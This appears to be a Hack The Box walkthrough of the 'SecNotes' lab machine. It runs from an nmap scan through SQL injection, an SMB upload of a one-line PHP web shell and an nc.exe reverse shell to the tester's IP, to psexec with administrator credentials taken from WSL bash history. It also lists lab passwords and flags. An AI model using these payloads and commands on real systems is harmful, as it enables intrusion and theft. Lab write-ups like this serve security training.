+++
title = "HTB - SecNotes"
date = 2025-02-11
+++

### Scan
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 16:15 EST
Nmap scan report for 10.10.10.97
Host is up (0.13s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Secure Notes - Login
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h40m00s, deviation: 4h37m09s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-02-09T21:18:26
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2025-02-09T13:18:25-08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.23 seconds
```

### Enumeration

We've got SMB and Web instances running IIS 10
When we visit the page, we're greeted with a login prompt. We can create an account and through the contact for, we find a potential user we can pivot to later at `tyler@secnotes.htb`
The interesting thing to note is that the banner on the site references contacting tyler. If we do so and send a link to our machine and set up a listener at 80, we can see that it's clicked and acted upon.
This tells us that we can set up an XSRF. Look to 0xdf for that route.
Another route that I went with was SQLi on the registration  form using `' or 1 = '1` and `password` to create a new account. Once logged in, we have access to everything.
We find credentials `tyler:92g!mA8BGjOirkL%OG*&`
Probe SMB: `nxc smb 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&' --shares`
<img alt="Image" async src="images/Screenshot 2025-02-09 at 16.51.53.png" width="800px"></img>
connect: `smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site`
We've got access to this site share, meaning we can see if we can publish to the site. If we create a test file `echo test > li0t.pdf` and use `put` to upload it onto the SMB server, we can verify with `curl http://10.10.10.97:8808/li0t.txt`

Once we know we're able to upload things, we can upload a webshell for code execution, and then netcat to get an interactive shell on the machine:

web shell
`smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put cmd.php li0t.php'
`
Really quick, make sure your shell is simple. had to make one from scratch:
```

<?php system($_REQUEST['cmd']); ?>

```

interactive nc
`smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /usr/share/seclists/Web-Shells/FuzzDB/nc.exe nc.exe'`

now, to invoke it: `curl "http://10.10.10.97:8808/li0t.php?cmd=nc.exe+-e+cmd.exe+10.10.14.10+443"`
USER: `6679aaefb03ecf8449c8ae25b6daf39e`
### Privilege Escalation
Really interesting stuff here. Windows server and linux subsystems
Learning from 0xdf here, the filesystem is buried in `C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs`

I don't know if this is standard, but I've never seen this before
We can go to the root directory and view bash history for admin creds: `administrator:u6!4ZwgwOM#^OBf#Nwnh`

I can use psexec for my shell since no winrm:
`python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@10.10.10.97`

ROOT: `e98f5b2ed1e5d1e80f183a04fb4dea86`



